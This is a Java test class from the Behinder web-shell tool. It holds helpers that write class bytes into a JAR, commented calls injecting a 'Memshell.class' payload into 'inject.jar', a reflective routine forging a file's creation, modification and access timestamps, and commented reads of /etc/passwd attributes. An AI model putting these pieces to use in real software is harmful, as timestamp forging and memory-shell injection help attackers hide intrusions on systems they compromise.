package net.rebeyond.behinder.ui;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.spi.AttachProvider;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import net.rebeyond.behinder.utils.Utils;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.channels.SocketChannel;
import java.nio.file.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;

public class Test {
    private SocketChannel socketChannel;
    private Socket socket;
    private String action;


    private  void test() throws Exception {
        /*File f=new File("/etc/passwd");


        Class FilesCls = this.getClass().forName("java.nio.file.Files");
        Class PosixFileAttributesCls=this.getClass().forName("java.nio.file.attribute.PosixFileAttributes");
        Class PathsCls=this.getClass().forName("java.nio.file.Paths");
        Class PosixFilePermissionsCls=this.getClass().forName("java.nio.file.attribute.PosixFilePermissions");
        Object file = PathsCls.getMethod("get", String.class,String[].class).invoke(PathsCls.getClass(),"/etc/passwd",new String[]{});
        Object attrs=FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls,file,PosixFileAttributesCls,new LinkOption[]{});

        Object result=PosixFilePermissionsCls.getMethod("toString",java.util.Set.class).invoke(PosixFilePermissionsCls,PosixFileAttributesCls.getMethod("permissions").invoke(attrs));
        System.out.println(result);*/


        /*Class FilesCls = this.getClass().forName("java.nio.file.Files");
        Class BasicFileAttributesCls=this.getClass().forName("java.nio.file.attribute.BasicFileAttributes");
        Class PathsCls=this.getClass().forName("java.nio.file.Paths");
        Object file = PathsCls.getMethod("get", String.class,String[].class).invoke(PathsCls.getClass(),"/etc/passwd",new String[]{});
        Object attrs=FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls,file,BasicFileAttributesCls,new LinkOption[]{});
        Object createTime=BasicFileAttributesCls.getMethod("creationTime").invoke(attrs);
        Object lastAccessTime=BasicFileAttributesCls.getMethod("lastAccessTime").invoke(attrs);
        Object lastModifiedTime=BasicFileAttributesCls.getMethod("lastModifiedTime").invoke(attrs);
        System.out.println(createTime);
        System.out.println(lastAccessTime);
        System.out.println(lastModifiedTime);*/
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File("/tmp/b.txt");
        Class PathsCls=Class.forName("java.nio.file.Paths");
        Class BasicFileAttributeViewCls=Class.forName("java.nio.file.attribute.BasicFileAttributeView");
        Class FileTimeCls=Class.forName("java.nio.file.attribute.FileTime");
        Method getFileAttributeView=Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
        Object attributes=getFileAttributeView.invoke(Class.forName("java.nio.file.Files"),PathsCls.getMethod("get", String.class,String[].class).invoke(PathsCls.getClass(),"/tmp/b.txt",new String[]{}),BasicFileAttributeViewCls,new LinkOption[]{});
        Object createTime=FileTimeCls.getMethod("fromMillis", long.class).invoke(FileTimeCls,df.parse("2021/01/12 20:57:51").getTime());
        Object modifyTime=FileTimeCls.getMethod("fromMillis",long.class).invoke(FileTimeCls,df.parse("2021/01/12 20:57:54").getTime());
        Object accessTime=FileTimeCls.getMethod("fromMillis",long.class).invoke(FileTimeCls,df.parse("2021/01/12 20:57:57").getTime());
        BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes,modifyTime,accessTime,createTime);


    }
    static native void sendQuitTo(int var0) throws IOException;
    public static String getFileType(String fileName)
    {
        int extIndex=fileName.lastIndexOf(".");
        return extIndex>=0?fileName.substring(extIndex+1).toLowerCase():"";
    }
    private static String getCurrentPID() {
        String name = ManagementFactory.getRuntimeMXBean().getName();

        String pid = name.split("@")[0];
        return pid;
    }
    private static void modifyJar(String pathToJAR, String pathToClassInsideJAR, byte[] classBytes) throws IOException, CannotCompileException, NotFoundException {
        //REQUIRES JAVASSIST

        String classFileName = pathToClassInsideJAR.replace("\\", "/").substring(0, pathToClassInsideJAR.lastIndexOf('/'));
        FileOutputStream fos=new FileOutputStream(classFileName,false );
        fos.write(classBytes);
        fos.flush();
        fos.close();
        Map<String, String> launchenv = new HashMap<>();
        URI launchuri = URI.create("jar:"+new File(pathToJAR).toURI());
        launchenv.put("create", "true");
        try (FileSystem zipfs = FileSystems.newFileSystem(launchuri, launchenv)) {
            Path externalClassFile = Paths.get(classFileName);
            Path pathInJarfile = zipfs.getPath(pathToClassInsideJAR);
            // copy a file into the zip file

            Files.copy( externalClassFile,pathInJarfile,
                    StandardCopyOption.REPLACE_EXISTING );
        }
    }
    public static void updateJarFile(File srcJarFile, String targetFilePath,boolean update, byte[] classBytes) throws IOException {

        File tmpJarFile = File.createTempFile("tempJar", ".tmp");
        JarFile jarFile = new JarFile(srcJarFile);
        boolean jarUpdated = false;
        List<String> fileNames = new ArrayList<String>();

        try {
            JarOutputStream tempJarOutputStream = new JarOutputStream(new FileOutputStream(tmpJarFile));
            try {

                        JarEntry entryx = new JarEntry(targetFilePath);
                        fileNames.add(entryx.getName());
                        tempJarOutputStream.putNextEntry(entryx);
                        tempJarOutputStream.write(classBytes);



                // Copy original jar file to the temporary one.
                Enumeration<?> jarEntries = jarFile.entries();
                while (jarEntries.hasMoreElements()) {
                    JarEntry entry = (JarEntry) jarEntries.nextElement();
                    /*
                     * Ignore classes from the original jar which are being
                     * replaced
                     */
                    String[] fileNameArray = (String[]) fileNames
                            .toArray(new String[0]);
                    Arrays.sort(fileNameArray);// required for binary search
                    if (Arrays.binarySearch(fileNameArray, entry.getName()) < 0) {
                        InputStream entryInputStream = jarFile
                                .getInputStream(entry);
                        tempJarOutputStream.putNextEntry(entry);
                        byte[] buffer = new byte[1024];
                        int bytesRead = 0;
                        while ((bytesRead = entryInputStream.read(buffer)) != -1) {
                            tempJarOutputStream.write(buffer, 0, bytesRead);
                        }
                    } else if (!update) {
                        throw new IOException(
                                "Jar Update Aborted: Entry "
                                        + entry.getName()
                                        + " could not be added to the jar"
                                        + " file because it already exists and the update parameter was false");
                    }
                }

                jarUpdated = true;
            } catch (Exception ex) {
                System.err.println("Unable to update jar file");
                tempJarOutputStream.putNextEntry(new JarEntry("stub"));
            } finally {
                tempJarOutputStream.close();
            }

        } finally {
            jarFile.close();
            // System.out.println(srcJarFile.getAbsolutePath() + " closed.");

            if (!jarUpdated) {
                tmpJarFile.delete();
            }
        }

        if (jarUpdated) {
            srcJarFile.delete();
            tmpJarFile.renameTo(srcJarFile);
            // System.out.println(srcJarFile.getAbsolutePath() + " updated.");
        }
    }
    /*public static void main(String[] args) throws Exception {

        //modifyJar("/Users/rebeyond/inject.jar","Memshell.class/","test".getBytes());
        updateJarFile(new File("/Users/rebeyond/inject.jar"),"net/rebeyond/payload/java/Memshell.class",true,"test".getBytes());
    }*/


        public static void main(String [] args) throws Throwable {


            System.setProperty("jdk.attach.allowAttachSelf","true");
            //System.out.println(System.getProperty("jdk.attach.allowAttachSelf"));

        }

    private static String getParentPath(String currentPath)
    {
        String parentPath=currentPath;

            //System.out.println("current path:"+currentPath);
            File parentFile=new File(currentPath).getParentFile();
            //System.out.println("current file:"+parentFile+",current path"+parentFile.getPath());
            if (parentFile!=null)
                parentPath=parentFile.getPath();  //因为路径里面最后有个/，所以向上要取两次才能得到上级目录
        //System.out.println("parent return:"+Utils.formatPath(parentPath));
        return Utils.formatPath(parentPath);
    }
}
